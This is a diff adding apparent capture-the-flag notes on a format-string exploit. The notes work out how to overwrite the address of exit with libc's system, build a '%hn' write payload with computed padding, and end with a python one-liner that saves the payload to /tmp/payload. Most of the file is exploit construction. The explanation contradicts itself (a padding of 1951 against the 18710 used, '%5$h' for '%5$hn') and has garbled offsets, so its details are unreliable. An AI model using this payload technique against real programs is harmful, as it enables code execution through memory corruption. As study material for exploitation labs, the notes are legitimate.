@@ -1,0 +1,28 @@
+exit:       0xf7e5eb70   <==>   \x70\xeb\xe5\xf7
+system:     0xf7e6aed0
+
+
+# Need to overwrite 0xf7e5eb70 (QT.exit) with 0xf7e6aed0 (LIBC .system)
+
+# It means writing 0xf7e6 (63462) @ 0xf7e5eb70 + 2 = 0xf7e5eb72 (high order)
+#              and 0xaed0 (44752) @ 0xf7e5eb70 (low order)
+
+# Now, we have to figure out the value to set for the padding. Here is the formula
+[The value we want] - [The bytes alredy wrote] = [The value to set].
+# Let's start with the low order bytes :
+It'll will be 44752 - 8 = 44744, because we already wrote 8 bytes (the two 4 bytes addresses).
+
+# Then, the high order bytes :
+It'll will be 63462 - 44752 = 18710, because we already wrote 44752 bytes (the two 4 bytes addresses and 44744 bytes from the previous writing).
+
+ # Now we can construct the exploit (note our write offset is %4 so we want [°4,85] as offsets instead of [°7,%8]) :
+It'll be :  \x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn.
+Let me explain :    \x70\xeb\xe5\xf7 or 0xf7e5eb70 (in reverse order) points to the low order bytes.
+                    \x72\xeb\xe5\xf7 or 0xf7e5eb72 (in reverse order) points to the high order bytes.
+                    %44744× will write 44744 bytes on the standard output.
+                    %4$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0xf7e5eb70).
+                    %1951x will write 1951 bytes on the standard output.
+                    %5$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0xf7e5eb72).
+
+
+python -c "print '\x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn'" > /tmp/payload
